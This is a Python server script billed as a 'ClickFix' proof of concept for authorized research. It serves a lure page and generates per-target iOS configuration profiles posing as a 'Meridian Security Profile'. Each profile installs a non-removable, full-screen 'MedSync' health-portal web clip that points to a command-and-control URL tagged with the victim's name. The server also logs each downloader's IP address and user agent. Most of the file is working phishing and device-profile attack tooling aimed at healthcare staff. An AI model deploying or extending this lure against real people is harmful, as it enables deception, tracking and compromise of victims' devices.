#!/usr/bin/env python3
"""
ClickFix PoC server — serves the lure page + generates per-target WebClip mobileconfigs.
Authorized security research / DEFCON demo only.

EXTERNAL BIND AUTHORIZED 2026-05-18 by Hamudi (terminal, explicit `approved`
+ engagement sentinel memory/engagements/clalit-recon-2026-05-12/.allow-destructive)
for TEAM TESTING ONLY.
"""
import os, time, uuid
from aiohttp import web

ROOT = os.path.dirname(os.path.abspath(__file__))

# ── UPDATE THESE before deployment ──
LURE_URL = os.environ.get("LURE_URL", "https://astrology-amplifier-engaged-seminars.trycloudflare.com")
# C2_URL: the WebClip C2 app the implant loads after install (separate from the lure)
C2_URL   = os.environ.get("C2_URL", "")

# Base64-encoded 120x120 MedSync icon (blue gradient + white M)
MEDSYNC_ICON_B64 = "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"

# ── Profile templates ──────────────────────────────────────────────────────
# Each template is a (display_name, plist_body) pair.
# Variables available: {clip_uuid}, {profile_uuid}, {lure_url}, {target_enc}

_PLIST_HEADER = """\
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>"""

_PLIST_FOOTER = """\
  <key>PayloadOrganization</key>
  <string>Meridian Systems Information Security</string>
  <key>PayloadRemovalDisallowed</key>
  <false/>
  <key>PayloadType</key>
  <string>Configuration</string>
  <key>PayloadUUID</key>
  <string>{profile_uuid}</string>
  <key>PayloadVersion</key>
  <integer>1</integer>
</dict>
</plist>"""

TEMPLATES = {
    # ── Default: WebClip ──────────────────────────────────────────────────
    "webclip": {
        "display_name": "Meridian Security Profile",
        "description":  "Installs MedSync Employee Health Portal on your Home Screen.",
        "identifier":   "com.meridian.security.profile.{profile_uuid}",
        "payload": """\
  <key>PayloadContent</key>
  <array>
    <dict>
      <key>FullScreen</key>
      <true/>
      <key>Icon</key>
      <data>""" + MEDSYNC_ICON_B64 + """</data>
      <key>IsRemovable</key>
      <false/>
      <key>Label</key>
      <string>MedSync</string>
      <key>PayloadDescription</key>
      <string>Adds MedSync Employee Health Portal to your Home Screen.</string>
      <key>PayloadDisplayName</key>
      <string>MedSync WebClip</string>
      <key>PayloadIdentifier</key>
      <string>com.meridian.medsync.webclip.{clip_uuid}</string>
      <key>PayloadType</key>
      <string>com.apple.webClip.managed</string>
      <key>PayloadUUID</key>
      <string>{clip_uuid}</string>
      <key>PayloadVersion</key>
      <integer>1</integer>
      <key>URL</key>
      <string>{c2_url}/?name={target_enc}</string>
    </dict>
  </array>
  <key>PayloadDescription</key>
  <string>Meridian Systems Security Profile — installs MedSync Employee Health Portal.</string>
  <key>PayloadDisplayName</key>
  <string>Meridian Security Profile</string>
  <key>PayloadIdentifier</key>
  <string>com.meridian.security.profile.{profile_uuid}</string>""",
    },
    # ── Add more templates here, e.g. "vpn", "wifi", "mdm" ───────────────
}

DEFAULT_TEMPLATE = "webclip"


def render_profile(tmpl_name, *, clip_uuid, profile_uuid, target_enc):
    tmpl = TEMPLATES.get(tmpl_name) or TEMPLATES[DEFAULT_TEMPLATE]
    body = tmpl["payload"].format(
        clip_uuid=clip_uuid, profile_uuid=profile_uuid,
        lure_url=LURE_URL, c2_url=C2_URL, target_enc=target_enc,
    )
    footer = _PLIST_FOOTER.format(profile_uuid=profile_uuid)
    return _PLIST_HEADER + "\n" + body + "\n" + footer

_profile_log = []  # in-memory log of who downloaded a profile


async def index(req):
    return web.FileResponse(os.path.join(ROOT, "index.html"))


async def profile(req):
    """Generate a per-target mobileconfig on the fly. ?name=Target &tmpl=webclip (default)"""
    target    = req.query.get("name", "").strip()[:64]
    tmpl_name = req.query.get("tmpl", DEFAULT_TEMPLATE).strip()
    target_enc = target.replace("&", "&amp;").replace("<", "").replace(">", "")

    clip_uuid    = str(uuid.uuid4()).upper()
    profile_uuid = str(uuid.uuid4()).upper()

    body = render_profile(
        tmpl_name,
        clip_uuid=clip_uuid,
        profile_uuid=profile_uuid,
        target_enc=target_enc,
    )

    ip = req.headers.get("X-Forwarded-For", req.remote)
    ua = req.headers.get("User-Agent", "")
    ts = time.strftime("%H:%M:%S")
    entry = {"ts": ts, "ip": ip, "ua": ua[:80], "target": target, "tmpl": tmpl_name, "clip_uuid": clip_uuid}
    _profile_log.append(entry)
    print(f"[{ts}] PROFILE DOWNLOAD | tmpl={tmpl_name} | target={target!r} | ip={ip} | uuid={clip_uuid}")

    return web.Response(
        body=body.encode(),
        content_type="application/x-apple-aspen-config",
        headers={
            "Content-Disposition": 'attachment; filename="MeridianSecurityProfile.mobileconfig"',
        },
    )


async def profile_log(req):
    return web.json_response(_profile_log)


async def downloads_page(req):
    return web.FileResponse(os.path.join(ROOT, "downloads.html"))


def main():
    app = web.Application()
    app.router.add_get("/",            index)
    app.router.add_get("/profile",     profile)
    app.router.add_get("/profile-log",   profile_log)
    app.router.add_get("/downloads",     downloads_page)
    # serve any other static file (assets/, etc.)
    app.router.add_static("/", ROOT, show_index=False)

    if not C2_URL:
        print("[WARN] C2_URL is not set — WebClip will point to empty URL. Set C2_URL env var.")
    print("ClickFix PoC server")
    print(f"  Lure URL → {LURE_URL}")
    print(f"  C2 URL   → {C2_URL or '(not set)'}")
    print("  /profile?name=TargetName  — generates WebClip mobileconfig pointing to C2_URL")
    print("  /profile-log              — who downloaded a profile")
    web.run_app(app, host="0.0.0.0", port=3001, access_log=None)


if __name__ == "__main__":
    main()
